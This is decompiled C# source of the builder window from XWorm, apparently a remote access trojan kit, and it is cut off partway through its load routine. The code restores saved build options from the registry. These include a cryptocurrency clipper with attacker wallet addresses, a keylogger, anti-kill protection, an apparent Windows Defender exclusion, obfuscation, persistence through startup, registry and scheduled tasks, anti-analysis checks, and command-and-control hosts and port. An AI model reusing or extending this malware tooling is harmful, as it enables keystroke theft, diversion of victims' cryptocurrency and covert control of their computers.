using System;
using System.CodeDom.Compiler;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using Guna.UI2.WinForms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using SimpleObfuscator;
using XWorm.My;
using XWorm.My.Resources;

namespace XWorm
{
	// Token: 0x02000012 RID: 18
	[DesignerGenerated]
	public partial class Builder : Form
	{
		// Token: 0x170000AD RID: 173
		// (get) Token: 0x060001BC RID: 444 RVA: 0x00012C7F File Offset: 0x00010E7F
		// (set) Token: 0x060001BD RID: 445 RVA: 0x00012C89 File Offset: 0x00010E89
		internal virtual PictureBox PictureBox1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000AE RID: 174
		// (get) Token: 0x060001BE RID: 446 RVA: 0x00012C92 File Offset: 0x00010E92
		// (set) Token: 0x060001BF RID: 447 RVA: 0x00012C9C File Offset: 0x00010E9C
		internal virtual Label Label3 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000AF RID: 175
		// (get) Token: 0x060001C0 RID: 448 RVA: 0x00012CA5 File Offset: 0x00010EA5
		// (set) Token: 0x060001C1 RID: 449 RVA: 0x00012CAF File Offset: 0x00010EAF
		internal virtual Label Label1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000B0 RID: 176
		// (get) Token: 0x060001C2 RID: 450 RVA: 0x00012CB8 File Offset: 0x00010EB8
		// (set) Token: 0x060001C3 RID: 451 RVA: 0x00012CC2 File Offset: 0x00010EC2
		internal virtual ListBox ListBox1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000B1 RID: 177
		// (get) Token: 0x060001C4 RID: 452 RVA: 0x00012CCB File Offset: 0x00010ECB
		// (set) Token: 0x060001C5 RID: 453 RVA: 0x00012CD8 File Offset: 0x00010ED8
		internal virtual Guna2GradientButton Guna2GradientButton1
		{
			[CompilerGenerated]
			get
			{
				return this._Guna2GradientButton1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Guna2GradientButton1_Click);
				Guna2GradientButton guna2GradientButton = this._Guna2GradientButton1;
				if (guna2GradientButton != null)
				{
					guna2GradientButton.Click -= value2;
				}
				this._Guna2GradientButton1 = value;
				guna2GradientButton = this._Guna2GradientButton1;
				if (guna2GradientButton != null)
				{
					guna2GradientButton.Click += value2;
				}
			}
		}

		// Token: 0x170000B2 RID: 178
		// (get) Token: 0x060001C6 RID: 454 RVA: 0x00012D1B File Offset: 0x00010F1B
		// (set) Token: 0x060001C7 RID: 455 RVA: 0x00012D28 File Offset: 0x00010F28
		internal virtual Guna2TextBox Guna2TextBox3
		{
			[CompilerGenerated]
			get
			{
				return this._Guna2TextBox3;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.Guna2TextBox3_TextChanged);
				Guna2TextBox guna2TextBox = this._Guna2TextBox3;
				if (guna2TextBox != null)
				{
					guna2TextBox.TextChanged -= eventHandler;
				}
				this._Guna2TextBox3 = value;
				guna2TextBox = this._Guna2TextBox3;
				if (guna2TextBox != null)
				{
					guna2TextBox.TextChanged += eventHandler;
				}
			}
		}

		// Token: 0x170000B3 RID: 179
		// (get) Token: 0x060001C8 RID: 456 RVA: 0x00012D6B File Offset: 0x00010F6B
		// (set) Token: 0x060001C9 RID: 457 RVA: 0x00012D75 File Offset: 0x00010F75
		internal virtual Label Label10 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000B4 RID: 180
		// (get) Token: 0x060001CA RID: 458 RVA: 0x00012D7E File Offset: 0x00010F7E
		// (set) Token: 0x060001CB RID: 459 RVA: 0x00012D88 File Offset: 0x00010F88
		internal virtual Guna2TextBox Guna2TextBox1
		{
			[CompilerGenerated]
			get
			{
				return this._Guna2TextBox1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.Guna2TextBox1_TextChanged);
				Guna2TextBox guna2TextBox = this._Guna2TextBox1;
				if (guna2TextBox != null)
				{
					guna2TextBox.TextChanged -= eventHandler;
				}
				this._Guna2TextBox1 = value;
				guna2TextBox = this._Guna2TextBox1;
				if (guna2TextBox != null)
				{
					guna2TextBox.TextChanged += eventHandler;
				}
			}
		}

		// Token: 0x170000B5 RID: 181
		// (get) Token: 0x060001CC RID: 460 RVA: 0x00012DCB File Offset: 0x00010FCB
		// (set) Token: 0x060001CD RID: 461 RVA: 0x00012DD5 File Offset: 0x00010FD5
		internal virtual Label Label9 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000B6 RID: 182
		// (get) Token: 0x060001CE RID: 462 RVA: 0x00012DDE File Offset: 0x00010FDE
		// (set) Token: 0x060001CF RID: 463 RVA: 0x00012DE8 File Offset: 0x00010FE8
		internal virtual Guna2TextBox Guna2TextBox2
		{
			[CompilerGenerated]
			get
			{
				return this._Guna2TextBox2;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				KeyEventHandler value2 = new KeyEventHandler(this.Guna2TextBox2_KeyDown);
				EventHandler eventHandler = new EventHandler(this.Guna2TextBox2_IconRightClick);
				EventHandler eventHandler2 = new EventHandler(this.Guna2TextBox2_IconLeftClick);
				Guna2TextBox guna2TextBox = this._Guna2TextBox2;
				if (guna2TextBox != null)
				{
					guna2TextBox.KeyDown -= value2;
					guna2TextBox.IconRightClick -= eventHandler;
					guna2TextBox.IconLeftClick -= eventHandler2;
				}
				this._Guna2TextBox2 = value;
				guna2TextBox = this._Guna2TextBox2;
				if (guna2TextBox != null)
				{
					guna2TextBox.KeyDown += value2;
					guna2TextBox.IconRightClick += eventHandler;
					guna2TextBox.IconLeftClick += eventHandler2;
				}
			}
		}

		// Token: 0x170000B7 RID: 183
		// (get) Token: 0x060001D0 RID: 464 RVA: 0x00012E61 File Offset: 0x00011061
		// (set) Token: 0x060001D1 RID: 465 RVA: 0x00012E6B File Offset: 0x0001106B
		internal virtual Label Label12 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000B8 RID: 184
		// (get) Token: 0x060001D2 RID: 466 RVA: 0x00012E74 File Offset: 0x00011074
		// (set) Token: 0x060001D3 RID: 467 RVA: 0x00012E7E File Offset: 0x0001107E
		internal virtual Guna2TextBox Guna2TextBox4 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000B9 RID: 185
		// (get) Token: 0x060001D4 RID: 468 RVA: 0x00012E87 File Offset: 0x00011087
		// (set) Token: 0x060001D5 RID: 469 RVA: 0x00012E94 File Offset: 0x00011094
		internal virtual Guna2CheckBox Guna2CheckBox3
		{
			[CompilerGenerated]
			get
			{
				return this._Guna2CheckBox3;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Guna2CheckBox3_CheckedChanged);
				Guna2CheckBox guna2CheckBox = this._Guna2CheckBox3;
				if (guna2CheckBox != null)
				{
					guna2CheckBox.CheckedChanged -= value2;
				}
				this._Guna2CheckBox3 = value;
				guna2CheckBox = this._Guna2CheckBox3;
				if (guna2CheckBox != null)
				{
					guna2CheckBox.CheckedChanged += value2;
				}
			}
		}

		// Token: 0x170000BA RID: 186
		// (get) Token: 0x060001D6 RID: 470 RVA: 0x00012ED7 File Offset: 0x000110D7
		// (set) Token: 0x060001D7 RID: 471 RVA: 0x00012EE1 File Offset: 0x000110E1
		internal virtual ImageList ImageList1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000BB RID: 187
		// (get) Token: 0x060001D8 RID: 472 RVA: 0x00012EEA File Offset: 0x000110EA
		// (set) Token: 0x060001D9 RID: 473 RVA: 0x00012EF4 File Offset: 0x000110F4
		internal virtual Guna2CheckBox Guna2CheckBox4 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000BC RID: 188
		// (get) Token: 0x060001DA RID: 474 RVA: 0x00012EFD File Offset: 0x000110FD
		// (set) Token: 0x060001DB RID: 475 RVA: 0x00012F08 File Offset: 0x00011108
		internal virtual Guna2CheckBox Guna2CheckBox2
		{
			[CompilerGenerated]
			get
			{
				return this._Guna2CheckBox2;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Guna2CheckBox2_CheckedChanged);
				Guna2CheckBox guna2CheckBox = this._Guna2CheckBox2;
				if (guna2CheckBox != null)
				{
					guna2CheckBox.CheckedChanged -= value2;
				}
				this._Guna2CheckBox2 = value;
				guna2CheckBox = this._Guna2CheckBox2;
				if (guna2CheckBox != null)
				{
					guna2CheckBox.CheckedChanged += value2;
				}
			}
		}

		// Token: 0x170000BD RID: 189
		// (get) Token: 0x060001DC RID: 476 RVA: 0x00012F4B File Offset: 0x0001114B
		// (set) Token: 0x060001DD RID: 477 RVA: 0x00012F58 File Offset: 0x00011158
		internal virtual Guna2CheckBox Guna2CheckBox1
		{
			[CompilerGenerated]
			get
			{
				return this._Guna2CheckBox1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Guna2CheckBox1_CheckedChanged);
				Guna2CheckBox guna2CheckBox = this._Guna2CheckBox1;
				if (guna2CheckBox != null)
				{
					guna2CheckBox.CheckedChanged -= value2;
				}
				this._Guna2CheckBox1 = value;
				guna2CheckBox = this._Guna2CheckBox1;
				if (guna2CheckBox != null)
				{
					guna2CheckBox.CheckedChanged += value2;
				}
			}
		}

		// Token: 0x170000BE RID: 190
		// (get) Token: 0x060001DE RID: 478 RVA: 0x00012F9B File Offset: 0x0001119B
		// (set) Token: 0x060001DF RID: 479 RVA: 0x00012FA8 File Offset: 0x000111A8
		internal virtual Guna2ToggleSwitch Guna2ToggleSwitch6
		{
			[CompilerGenerated]
			get
			{
				return this._Guna2ToggleSwitch6;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				MouseEventHandler value2 = new MouseEventHandler(this.Guna2ToggleSwitch6_MouseClick);
				Guna2ToggleSwitch guna2ToggleSwitch = this._Guna2ToggleSwitch6;
				if (guna2ToggleSwitch != null)
				{
					guna2ToggleSwitch.MouseClick -= value2;
				}
				this._Guna2ToggleSwitch6 = value;
				guna2ToggleSwitch = this._Guna2ToggleSwitch6;
				if (guna2ToggleSwitch != null)
				{
					guna2ToggleSwitch.MouseClick += value2;
				}
			}
		}

		// Token: 0x170000BF RID: 191
		// (get) Token: 0x060001E0 RID: 480 RVA: 0x00012FEB File Offset: 0x000111EB
		// (set) Token: 0x060001E1 RID: 481 RVA: 0x00012FF5 File Offset: 0x000111F5
		internal virtual Label Label19 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000C0 RID: 192
		// (get) Token: 0x060001E2 RID: 482 RVA: 0x00012FFE File Offset: 0x000111FE
		// (set) Token: 0x060001E3 RID: 483 RVA: 0x00013008 File Offset: 0x00011208
		internal virtual Guna2ToggleSwitch Guna2ToggleSwitch5
		{
			[CompilerGenerated]
			get
			{
				return this._Guna2ToggleSwitch5;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				MouseEventHandler value2 = new MouseEventHandler(this.Guna2ToggleSwitch5_MouseClick);
				Guna2ToggleSwitch guna2ToggleSwitch = this._Guna2ToggleSwitch5;
				if (guna2ToggleSwitch != null)
				{
					guna2ToggleSwitch.MouseClick -= value2;
				}
				this._Guna2ToggleSwitch5 = value;
				guna2ToggleSwitch = this._Guna2ToggleSwitch5;
				if (guna2ToggleSwitch != null)
				{
					guna2ToggleSwitch.MouseClick += value2;
				}
			}
		}

		// Token: 0x170000C1 RID: 193
		// (get) Token: 0x060001E4 RID: 484 RVA: 0x0001304B File Offset: 0x0001124B
		// (set) Token: 0x060001E5 RID: 485 RVA: 0x00013055 File Offset: 0x00011255
		internal virtual Label Label18 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000C2 RID: 194
		// (get) Token: 0x060001E6 RID: 486 RVA: 0x0001305E File Offset: 0x0001125E
		// (set) Token: 0x060001E7 RID: 487 RVA: 0x00013068 File Offset: 0x00011268
		internal virtual Guna2ToggleSwitch Guna2ToggleSwitch4 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000C3 RID: 195
		// (get) Token: 0x060001E8 RID: 488 RVA: 0x00013071 File Offset: 0x00011271
		// (set) Token: 0x060001E9 RID: 489 RVA: 0x0001307B File Offset: 0x0001127B
		internal virtual Label Label17 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000C4 RID: 196
		// (get) Token: 0x060001EA RID: 490 RVA: 0x00013084 File Offset: 0x00011284
		// (set) Token: 0x060001EB RID: 491 RVA: 0x0001308E File Offset: 0x0001128E
		internal virtual Guna2ToggleSwitch Guna2ToggleSwitch3 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000C5 RID: 197
		// (get) Token: 0x060001EC RID: 492 RVA: 0x00013097 File Offset: 0x00011297
		// (set) Token: 0x060001ED RID: 493 RVA: 0x000130A1 File Offset: 0x000112A1
		internal virtual Label Label16 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000C6 RID: 198
		// (get) Token: 0x060001EE RID: 494 RVA: 0x000130AA File Offset: 0x000112AA
		// (set) Token: 0x060001EF RID: 495 RVA: 0x000130B4 File Offset: 0x000112B4
		internal virtual Guna2ToggleSwitch Guna2ToggleSwitch2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000C7 RID: 199
		// (get) Token: 0x060001F0 RID: 496 RVA: 0x000130BD File Offset: 0x000112BD
		// (set) Token: 0x060001F1 RID: 497 RVA: 0x000130C7 File Offset: 0x000112C7
		internal virtual Label Label15 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000C8 RID: 200
		// (get) Token: 0x060001F2 RID: 498 RVA: 0x000130D0 File Offset: 0x000112D0
		// (set) Token: 0x060001F3 RID: 499 RVA: 0x000130DA File Offset: 0x000112DA
		internal virtual Guna2ToggleSwitch Guna2ToggleSwitch1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000C9 RID: 201
		// (get) Token: 0x060001F4 RID: 500 RVA: 0x000130E3 File Offset: 0x000112E3
		// (set) Token: 0x060001F5 RID: 501 RVA: 0x000130ED File Offset: 0x000112ED
		internal virtual Label Label14 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000CA RID: 202
		// (get) Token: 0x060001F6 RID: 502 RVA: 0x000130F6 File Offset: 0x000112F6
		// (set) Token: 0x060001F7 RID: 503 RVA: 0x00013100 File Offset: 0x00011300
		internal virtual Guna2CheckBox Guna2CheckBox7
		{
			[CompilerGenerated]
			get
			{
				return this._Guna2CheckBox7;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Guna2CheckBox7_CheckedChanged);
				Guna2CheckBox guna2CheckBox = this._Guna2CheckBox7;
				if (guna2CheckBox != null)
				{
					guna2CheckBox.CheckedChanged -= value2;
				}
				this._Guna2CheckBox7 = value;
				guna2CheckBox = this._Guna2CheckBox7;
				if (guna2CheckBox != null)
				{
					guna2CheckBox.CheckedChanged += value2;
				}
			}
		}

		// Token: 0x170000CB RID: 203
		// (get) Token: 0x060001F8 RID: 504 RVA: 0x00013143 File Offset: 0x00011343
		// (set) Token: 0x060001F9 RID: 505 RVA: 0x00013150 File Offset: 0x00011350
		internal virtual Guna2CheckBox Guna2CheckBox6
		{
			[CompilerGenerated]
			get
			{
				return this._Guna2CheckBox6;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Guna2CheckBox6_CheckedChanged);
				Guna2CheckBox guna2CheckBox = this._Guna2CheckBox6;
				if (guna2CheckBox != null)
				{
					guna2CheckBox.CheckedChanged -= value2;
				}
				this._Guna2CheckBox6 = value;
				guna2CheckBox = this._Guna2CheckBox6;
				if (guna2CheckBox != null)
				{
					guna2CheckBox.CheckedChanged += value2;
				}
			}
		}

		// Token: 0x170000CC RID: 204
		// (get) Token: 0x060001FA RID: 506 RVA: 0x00013193 File Offset: 0x00011393
		// (set) Token: 0x060001FB RID: 507 RVA: 0x000131A0 File Offset: 0x000113A0
		internal virtual Guna2CheckBox Guna2CheckBox5
		{
			[CompilerGenerated]
			get
			{
				return this._Guna2CheckBox5;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Guna2CheckBox5_CheckedChanged);
				Guna2CheckBox guna2CheckBox = this._Guna2CheckBox5;
				if (guna2CheckBox != null)
				{
					guna2CheckBox.CheckedChanged -= value2;
				}
				this._Guna2CheckBox5 = value;
				guna2CheckBox = this._Guna2CheckBox5;
				if (guna2CheckBox != null)
				{
					guna2CheckBox.CheckedChanged += value2;
				}
			}
		}

		// Token: 0x170000CD RID: 205
		// (get) Token: 0x060001FC RID: 508 RVA: 0x000131E3 File Offset: 0x000113E3
		// (set) Token: 0x060001FD RID: 509 RVA: 0x000131ED File Offset: 0x000113ED
		internal virtual Guna2TabControl Guna2TabControl1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000CE RID: 206
		// (get) Token: 0x060001FE RID: 510 RVA: 0x000131F6 File Offset: 0x000113F6
		// (set) Token: 0x060001FF RID: 511 RVA: 0x00013200 File Offset: 0x00011400
		internal virtual TabPage TabPage1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000CF RID: 207
		// (get) Token: 0x06000200 RID: 512 RVA: 0x00013209 File Offset: 0x00011409
		// (set) Token: 0x06000201 RID: 513 RVA: 0x00013213 File Offset: 0x00011413
		internal virtual TabPage TabPage2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000D0 RID: 208
		// (get) Token: 0x06000202 RID: 514 RVA: 0x0001321C File Offset: 0x0001141C
		// (set) Token: 0x06000203 RID: 515 RVA: 0x00013226 File Offset: 0x00011426
		internal virtual Guna2TextBox Guna2TextBox5 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000D1 RID: 209
		// (get) Token: 0x06000204 RID: 516 RVA: 0x0001322F File Offset: 0x0001142F
		// (set) Token: 0x06000205 RID: 517 RVA: 0x00013239 File Offset: 0x00011439
		internal virtual TabPage TabPage3 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000D2 RID: 210
		// (get) Token: 0x06000206 RID: 518 RVA: 0x00013242 File Offset: 0x00011442
		// (set) Token: 0x06000207 RID: 519 RVA: 0x0001324C File Offset: 0x0001144C
		internal virtual Guna2TextBox Guna2TextBox6 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000D3 RID: 211
		// (get) Token: 0x06000208 RID: 520 RVA: 0x00013255 File Offset: 0x00011455
		// (set) Token: 0x06000209 RID: 521 RVA: 0x00013260 File Offset: 0x00011460
		internal virtual Guna2CheckBox Guna2CheckBox8
		{
			[CompilerGenerated]
			get
			{
				return this._Guna2CheckBox8;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Guna2CheckBox8_CheckedChanged);
				Guna2CheckBox guna2CheckBox = this._Guna2CheckBox8;
				if (guna2CheckBox != null)
				{
					guna2CheckBox.CheckedChanged -= value2;
				}
				this._Guna2CheckBox8 = value;
				guna2CheckBox = this._Guna2CheckBox8;
				if (guna2CheckBox != null)
				{
					guna2CheckBox.CheckedChanged += value2;
				}
			}
		}

		// Token: 0x170000D4 RID: 212
		// (get) Token: 0x0600020A RID: 522 RVA: 0x000132A3 File Offset: 0x000114A3
		// (set) Token: 0x0600020B RID: 523 RVA: 0x000132AD File Offset: 0x000114AD
		internal virtual Guna2ComboBox Guna2ComboBox2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000D5 RID: 213
		// (get) Token: 0x0600020C RID: 524 RVA: 0x000132B6 File Offset: 0x000114B6
		// (set) Token: 0x0600020D RID: 525 RVA: 0x000132C0 File Offset: 0x000114C0
		internal virtual Guna2NumericUpDown Guna2NumericUpDown1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000D6 RID: 214
		// (get) Token: 0x0600020E RID: 526 RVA: 0x000132C9 File Offset: 0x000114C9
		// (set) Token: 0x0600020F RID: 527 RVA: 0x000132D3 File Offset: 0x000114D3
		internal virtual Label Label13 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000D7 RID: 215
		// (get) Token: 0x06000210 RID: 528 RVA: 0x000132DC File Offset: 0x000114DC
		// (set) Token: 0x06000211 RID: 529 RVA: 0x000132E6 File Offset: 0x000114E6
		internal virtual Label Label20 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000D8 RID: 216
		// (get) Token: 0x06000212 RID: 530 RVA: 0x000132EF File Offset: 0x000114EF
		// (set) Token: 0x06000213 RID: 531 RVA: 0x000132F9 File Offset: 0x000114F9
		internal virtual PictureBox PictureBox4 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000D9 RID: 217
		// (get) Token: 0x06000214 RID: 532 RVA: 0x00013302 File Offset: 0x00011502
		// (set) Token: 0x06000215 RID: 533 RVA: 0x0001330C File Offset: 0x0001150C
		internal virtual Label Label2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000DA RID: 218
		// (get) Token: 0x06000216 RID: 534 RVA: 0x00013315 File Offset: 0x00011515
		// (set) Token: 0x06000217 RID: 535 RVA: 0x0001331F File Offset: 0x0001151F
		internal virtual Guna2TextBox Guna2TextBox7 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000DB RID: 219
		// (get) Token: 0x06000218 RID: 536 RVA: 0x00013328 File Offset: 0x00011528
		// (set) Token: 0x06000219 RID: 537 RVA: 0x00013332 File Offset: 0x00011532
		internal virtual PictureBox PictureBox2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000DC RID: 220
		// (get) Token: 0x0600021A RID: 538 RVA: 0x0001333B File Offset: 0x0001153B
		// (set) Token: 0x0600021B RID: 539 RVA: 0x00013345 File Offset: 0x00011545
		internal virtual Label Label4 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x0600021C RID: 540 RVA: 0x00013350 File Offset: 0x00011550
		public Builder()
		{
			base.Load += this.Builder_Load;
			this.xform = false;
			this.xform2 = false;
			this.InitializeComponent();
			base.Opacity = 0.0;
			Helper.FadeIn(this, 20);
		}

		// Token: 0x0600021D RID: 541 RVA: 0x000133A8 File Offset: 0x000115A8
		private void Builder_Load(object sender, EventArgs e)
		{
			try
			{
				bool flag = Conversions.ToBoolean(Operators.OrObject(Operators.CompareObjectEqual(MyProject.Computer.Registry.GetValue(SettingsHelper.RegSave, "Assembly", null), null, false), Operators.CompareObjectEqual(MyProject.Computer.Registry.GetValue(SettingsHelper.RegSave, "Assembly", null), "False", false)));
				if (flag)
				{
					this.assm = null;
					this.Guna2CheckBox1.Checked = false;
				}
				else
				{
					this.assm = Conversions.ToString(MyProject.Computer.Registry.GetValue(SettingsHelper.RegSave, "Assembly", null));
					this.xform = true;
					this.Guna2CheckBox1.Checked = true;
				}
				bool flag2 = Conversions.ToBoolean(Operators.OrObject(Operators.CompareObjectEqual(MyProject.Computer.Registry.GetValue(SettingsHelper.RegSave, "Icon", null), null, false), Operators.CompareObjectEqual(MyProject.Computer.Registry.GetValue(SettingsHelper.RegSave, "Icon", null), "False", false)));
				if (flag2)
				{
					this.iconpath = null;
					this.Guna2CheckBox2.Checked = false;
					this.PictureBox1.Image = null;
				}
				else
				{
					this.iconpath = Conversions.ToString(MyProject.Computer.Registry.GetValue(SettingsHelper.RegSave, "Icon", null));
					this.xform2 = true;
					this.Guna2CheckBox2.Checked = true;
					this.PictureBox1.ImageLocation = this.iconpath;
				}
				bool flag3 = Conversions.ToBoolean(Operators.OrObject(Operators.CompareObjectEqual(MyProject.Computer.Registry.GetValue(SettingsHelper.RegSave, "InstallDir", null), null, false), Operators.CompareObjectEqual(MyProject.Computer.Registry.GetValue(SettingsHelper.RegSave, "InstallDir", null), "False", false)));
				if (flag3)
				{
					this.Guna2ComboBox2.Enabled = false;
					this.Guna2TextBox5.Enabled = false;
					this.Guna2ComboBox2.SelectedIndex = 0;
				}
				else
				{
					this.Guna2ComboBox2.SelectedIndex = Convert.ToInt32(RuntimeHelpers.GetObjectValue(MyProject.Computer.Registry.GetValue(SettingsHelper.RegSave, "InstallDir", null)));
					this.Guna2ComboBox2.Enabled = true;
					this.Guna2TextBox5.Enabled = true;
				}
				bool flag4 = Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(MyProject.Computer.Registry.GetValue(SettingsHelper.RegSave, "InstallStr", null), null, false)));
				if (flag4)
				{
					this.Guna2TextBox5.Text = Conversions.ToString(MyProject.Computer.Registry.GetValue(SettingsHelper.RegSave, "InstallStr", null));
				}
				bool flag5 = Conversions.ToBoolean(Operators.OrObject(Operators.CompareObjectEqual(MyProject.Computer.Registry.GetValue(SettingsHelper.RegSave, "Clipper", null), null, false), Operators.CompareObjectEqual(MyProject.Computer.Registry.GetValue(SettingsHelper.RegSave, "Clipper", null), "False", false)));
				if (flag5)
				{
					this.Guna2ToggleSwitch6.Checked = false;
				}
				else
				{
					this.BTC = Conversions.ToString(MyProject.Computer.Registry.GetValue(SettingsHelper.RegSave, "BTC", null));
					this.ETH = Conversions.ToString(MyProject.Computer.Registry.GetValue(SettingsHelper.RegSave, "ETH", null));
					this.TRC20 = Conversions.ToString(MyProject.Computer.Registry.GetValue(SettingsHelper.RegSave, "TRC20", null));
					this.Guna2ToggleSwitch6.Checked = true;
				}
				bool flag6 = Operators.ConditionalCompareObjectEqual(MyProject.Computer.Registry.GetValue(SettingsHelper.RegSave, "Keylogger", null), "True", false);
				if (flag6)
				{
					this.Guna2ToggleSwitch2.Checked = true;
				}
				else
				{
					this.Guna2ToggleSwitch2.Checked = false;
				}
				bool flag7 = Operators.ConditionalCompareObjectEqual(MyProject.Computer.Registry.GetValue(SettingsHelper.RegSave, "AntiKill", null), "True", false);
				if (flag7)
				{
					this.Guna2ToggleSwitch3.Checked = true;
				}
				else
				{
					this.Guna2ToggleSwitch3.Checked = false;
				}
				bool flag8 = Operators.ConditionalCompareObjectEqual(MyProject.Computer.Registry.GetValue(SettingsHelper.RegSave, "WDEX", null), "True", false);
				if (flag8)
				{
					this.Guna2ToggleSwitch4.Checked = true;
				}
				else
				{
					this.Guna2ToggleSwitch4.Checked = false;
				}
				bool flag9 = Operators.ConditionalCompareObjectEqual(MyProject.Computer.Registry.GetValue(SettingsHelper.RegSave, "Obfuscator", null), "True", false);
				if (flag9)
				{
					this.Guna2CheckBox4.Checked = true;
				}
				else
				{
					this.Guna2CheckBox4.Checked = false;
				}
				bool flag10 = Operators.ConditionalCompareObjectEqual(MyProject.Computer.Registry.GetValue(SettingsHelper.RegSave, "Startup", null), "True", false);
				if (flag10)
				{
					this.Guna2CheckBox6.Checked = true;
				}
				else
				{
					this.Guna2CheckBox6.Checked = false;
				}
				bool flag11 = Operators.ConditionalCompareObjectEqual(MyProject.Computer.Registry.GetValue(SettingsHelper.RegSave, "Reg", null), "True", false);
				if (flag11)
				{
					this.Guna2CheckBox5.Checked = true;
				}
				else
				{
					this.Guna2CheckBox5.Checked = false;
				}
				bool flag12 = Operators.ConditionalCompareObjectEqual(MyProject.Computer.Registry.GetValue(SettingsHelper.RegSave, "Task", null), "True", false);
				if (flag12)
				{
					this.Guna2CheckBox7.Checked = true;
				}
				else
				{
					this.Guna2CheckBox7.Checked = false;
				}
				bool flag13 = Operators.ConditionalCompareObjectEqual(MyProject.Computer.Registry.GetValue(SettingsHelper.RegSave, "Analysis", null), "True", false);
				if (flag13)
				{
					this.Guna2ToggleSwitch1.Checked = true;
				}
				else
				{
					this.Guna2ToggleSwitch1.Checked = false;
				}
				bool flag14 = Operators.ConditionalCompareObjectEqual(MyProject.Computer.Registry.GetValue(SettingsHelper.RegSave, "Hosts", null), null, false);
				if (flag14)
				{
					this.ListBox1.Items.Add("127.0.0.1");
				}
				else
				{
					string expression = Conversions.ToString(MyProject.Computer.Registry.GetValue(SettingsHelper.RegSave, "Hosts", null));
					foreach (string text in Strings.Split(expression, ",", -1, CompareMethod.Binary))
					{
						bool flag15 = !string.IsNullOrEmpty(text);
						if (flag15)
						{
							this.ListBox1.Items.Add(text);
						}
					}
				}
				bool flag16 = Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(MyProject.Computer.Registry.GetValue(SettingsHelper.RegSave, "Port", null), null, false)));
				if (flag16)
				{
					this.Guna2TextBox3.Text = Conversions.ToString(MyProject.Computer.Registry.GetValue(SettingsHelper.RegSave, "Port", null));
				}
